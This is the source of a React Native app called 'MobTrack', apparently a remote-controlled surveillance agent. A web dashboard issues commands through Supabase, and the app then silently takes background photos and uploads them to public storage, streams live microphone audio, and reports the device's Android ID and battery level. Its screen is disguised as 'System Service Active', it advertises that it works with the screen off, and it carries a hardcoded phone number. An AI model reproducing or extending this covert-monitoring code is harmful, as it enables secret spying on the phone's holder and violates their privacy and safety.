import React, { useEffect, useRef, useState } from 'react';
import { Button, PermissionsAndroid, Platform, StyleSheet, Text, TextInput, View } from 'react-native';
import { decode } from 'base64-arraybuffer';
import { supabase } from './supabase';
import * as BackgroundCamera from './modules/background-camera';
import * as BackgroundAudio from './modules/background-audio';
import type { Subscription } from 'expo-modules-core';

export default function App() {
  const [linkedNumber, setLinkedNumber] = useState('6363738923');
  const [isListening, setIsListening] = useState(false);
  const [statusMsg, setStatusMsg] = useState('');
  const [permCameraGranted, setPermCameraGranted] = useState(false);
  const [permAudioGranted, setPermAudioGranted] = useState(false);

  // Stable refs — survive re-renders
  const deviceIdRef         = useRef<string>('');
  const audioChannelRef     = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const audioSubRef         = useRef<Subscription | null>(null);
  const isMicActiveRef      = useRef(false);
  const batteryIntervalRef  = useRef<ReturnType<typeof setInterval> | null>(null);

  // ── Permissions ───────────────────────────────────────────────────────────
  useEffect(() => {
    (async () => {
      if (Platform.OS !== 'android') { setPermCameraGranted(true); setPermAudioGranted(true); return; }
      const cam   = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.CAMERA);
      const audio = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.RECORD_AUDIO);
      setPermCameraGranted(cam);
      setPermAudioGranted(audio);
    })();
  }, []);

  const requestPermissions = async () => {
    const results = await PermissionsAndroid.requestMultiple([
      PermissionsAndroid.PERMISSIONS.CAMERA,
      PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
    ]);
    setPermCameraGranted(results[PermissionsAndroid.PERMISSIONS.CAMERA] === PermissionsAndroid.RESULTS.GRANTED);
    setPermAudioGranted(results[PermissionsAndroid.PERMISSIONS.RECORD_AUDIO] === PermissionsAndroid.RESULTS.GRANTED);
  };

  // ── Device info sync ──────────────────────────────────────────────────────
  // Pushes Android ID + live battery to the database so the website shows real data.
  const syncDeviceInfo = async () => {
    if (!deviceIdRef.current) return;
    try {
      const info = await BackgroundAudio.getDeviceInfo();
      await supabase
        .from('devices')
        .update({
          imei_number:   info.androidId,
          battery_level: info.batteryLevel,
          is_charging:   info.isCharging,
        })
        .eq('id', deviceIdRef.current);
    } catch (err) {
      console.warn('syncDeviceInfo failed:', err);
    }
  };

  // ── Mic helpers ───────────────────────────────────────────────────────────
  const startMic = async (deviceId: string) => {
    if (isMicActiveRef.current) return;
    isMicActiveRef.current = true;
    try {
      BackgroundAudio.startRecording();
      const channelName = `audio-stream-${linkedNumber}`;
      const ch = supabase.channel(channelName);
      audioChannelRef.current = ch;
      ch.subscribe();
      audioSubRef.current = BackgroundAudio.addAudioChunkListener(async (base64) => {
        try {
          await ch.send({ type: 'broadcast', event: 'audio-chunk', payload: { data: base64 } });
        } catch { }
      });
      await supabase.from('devices').update({ mic_streaming: true, pending_command: 'none' }).eq('id', deviceId);
      setStatusMsg('🎤 Mic streaming…');
    } catch (err: any) {
      isMicActiveRef.current = false;
      setStatusMsg('❌ Mic failed: ' + (err.message ?? 'unknown'));
    }
  };

  const stopMic = async (deviceId: string) => {
    if (!isMicActiveRef.current) return;
    isMicActiveRef.current = false;
    try { BackgroundAudio.stopRecording(); } catch { }
    audioSubRef.current?.remove();
    audioSubRef.current = null;
    if (audioChannelRef.current) { supabase.removeChannel(audioChannelRef.current); audioChannelRef.current = null; }
    await supabase.from('devices').update({ mic_streaming: false, pending_command: 'none' }).eq('id', deviceId).catch(() => {});
    setStatusMsg('🟢 Connected & listening');
  };

  // ── Supabase Realtime listener ────────────────────────────────────────────
  useEffect(() => {
    if (!isListening) return;
    console.log('Listening for commands on:', linkedNumber);

    const channel = supabase
      .channel('mobile-agent-channel')
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'devices',
        filter: `mobile_number=eq.${linkedNumber}`,
      }, async (payload) => {
        const cmd      = payload.new.pending_command as string;
        const deviceId = payload.new.id as string;
        deviceIdRef.current = deviceId;

        if (cmd === 'take_photo') {
          setStatusMsg('📸 Capturing…');
          try {
            const base64 = await BackgroundCamera.capturePhoto();
            const fileName = `capture_${Date.now()}.jpg`;
            const { error: uploadErr } = await supabase.storage
              .from('secure_media').upload(fileName, decode(base64), { contentType: 'image/jpeg' });
            if (uploadErr) throw uploadErr;
            const { data: { publicUrl } } = supabase.storage.from('secure_media').getPublicUrl(fileName);
            await supabase.from('devices').update({ latest_photo_url: publicUrl, pending_command: 'none' }).eq('id', deviceId);
            setStatusMsg('✅ Photo sent!');
          } catch (err: any) {
            setStatusMsg('❌ ' + (err.message ?? 'Capture failed'));
            await supabase.from('devices').update({ pending_command: 'none' }).eq('id', deviceId).catch(() => {});
          }
        } else if (cmd === 'start_mic') {
          await startMic(deviceId);
        } else if (cmd === 'stop_mic') {
          await stopMic(deviceId);
        }
      })
      .subscribe(async (status) => {
        console.log('Realtime:', status);
        if (status === 'SUBSCRIBED') {
          setStatusMsg('🟢 Connected & listening');
          // Fetch device ID for info sync
          const { data } = await supabase
            .from('devices').select('id').eq('mobile_number', linkedNumber).single();
          if (data) {
            deviceIdRef.current = data.id;
            // Push initial device info (Android ID + battery)
            await syncDeviceInfo();
            // Refresh battery every 2 minutes while listener is active
            batteryIntervalRef.current = setInterval(syncDeviceInfo, 120_000);
          }
        }
      });

    return () => {
      supabase.removeChannel(channel);
      if (batteryIntervalRef.current) { clearInterval(batteryIntervalRef.current); batteryIntervalRef.current = null; }
      if (isMicActiveRef.current) {
        try { BackgroundAudio.stopRecording(); } catch { }
        audioSubRef.current?.remove();
        if (audioChannelRef.current) supabase.removeChannel(audioChannelRef.current);
        isMicActiveRef.current = false;
        audioSubRef.current = null;
        audioChannelRef.current = null;
      }
    };
  }, [isListening, linkedNumber]);

  // ── Start / Stop ──────────────────────────────────────────────────────────
  const handleStart = async () => {
    try {
      await BackgroundCamera.startService();
      setIsListening(true);
      setStatusMsg('Starting…');
    } catch (e: any) {
      setStatusMsg('❌ ' + (e.message ?? 'Failed to start'));
    }
  };

  const handleStop = async () => {
    if (batteryIntervalRef.current) { clearInterval(batteryIntervalRef.current); batteryIntervalRef.current = null; }
    if (isMicActiveRef.current) {
      try { BackgroundAudio.stopRecording(); } catch { }
      audioSubRef.current?.remove();
      if (audioChannelRef.current) supabase.removeChannel(audioChannelRef.current);
      isMicActiveRef.current = false;
      audioSubRef.current = null;
      audioChannelRef.current = null;
    }
    try { await BackgroundCamera.stopService(); } catch { }
    setIsListening(false);
    setStatusMsg('');
  };

  // ── Permission screen ─────────────────────────────────────────────────────
  if (!permCameraGranted || !permAudioGranted) {
    return (
      <View style={s.container}>
        <Text style={s.title}>Permissions Required</Text>
        <Text style={s.text}>MobTrack needs Camera and Microphone access.</Text>
        <View style={{ marginTop: 16 }}>
          <Button title="Grant Permissions" onPress={requestPermissions} />
        </View>
      </View>
    );
  }

  // ── Main UI ───────────────────────────────────────────────────────────────
  return (
    <View style={s.container}>
      <Text style={s.title}>System Service Active</Text>
      {!isListening ? (
        <View style={s.box}>
          <Text style={s.text}>Link to Dashboard Number:</Text>
          <TextInput
            style={s.input}
            value={linkedNumber}
            onChangeText={setLinkedNumber}
            keyboardType="phone-pad"
          />
          <Button title="START BACKGROUND LISTENER" onPress={handleStart} color="#0066cc" />
        </View>
      ) : (
        <View style={s.box}>
          <Text style={s.success}>Agent running for: {linkedNumber}</Text>
          {statusMsg ? <Text style={s.status}>{statusMsg}</Text> : null}
          <Text style={s.hint}>
            ✅ You can switch to any app.{'\n'}
            📱 Works with screen completely off.{'\n'}
            📸 Photos capture silently in background.{'\n'}
            🎤 Mic streams live when activated from dashboard.{'\n'}
            🔋 Battery & Device ID synced to dashboard.
          </Text>
          <View style={{ marginTop: 20 }}>
            <Button title="STOP SERVICE" onPress={handleStop} color="#cc0000" />
          </View>
        </View>
      )}
    </View>
  );
}

const s = StyleSheet.create({
  container: { flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#000', padding: 20 },
  title:     { fontSize: 20, fontWeight: 'bold', color: '#fff', marginBottom: 20 },
  text:      { color: '#ccc', marginBottom: 10, textAlign: 'center' },
  success:   { color: '#00ff00', textAlign: 'center', fontWeight: 'bold', marginBottom: 8 },
  status:    { color: '#00aaff', textAlign: 'center', marginTop: 8, fontSize: 14, fontWeight: '600' },
  hint:      { color: '#888', textAlign: 'left', marginTop: 16, fontSize: 12, lineHeight: 20 },
  box:       { width: '100%', backgroundColor: '#111', padding: 20, borderRadius: 10, borderWidth: 1, borderColor: '#333' },
  input:     { backgroundColor: '#222', color: '#fff', padding: 10, borderRadius: 5, marginBottom: 20, borderWidth: 1, borderColor: '#444' },
});